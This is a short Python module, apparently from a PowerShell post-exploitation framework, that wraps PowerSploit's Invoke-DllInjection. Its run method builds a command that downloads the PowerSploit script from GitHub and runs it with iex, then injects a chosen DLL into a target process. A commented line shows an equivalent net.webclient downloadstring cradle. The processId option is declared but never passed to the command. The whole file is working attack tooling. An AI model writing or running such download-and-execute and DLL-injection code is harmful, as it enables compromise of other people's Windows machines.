from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "DLL Injection",
                       "Description": "DLL Injection",
                       "Author": "Matthew Graeber",
                       "Link": "https://github.com/PowerShellMafia/PowerSploit",
                       "License": "BSD 3-Clause",
                       "Module": "@toolsprods"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "dll": [None, "DLL to inject", True],
                   "processId": [None, "Process ID to inject", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = '(make_request -URL https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1) | iex'
        #function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1');"
        function += 'Invoke-DllInjection -dll "{}"'.format(self.args["dll"])
        super(CustomModule, self).run(function)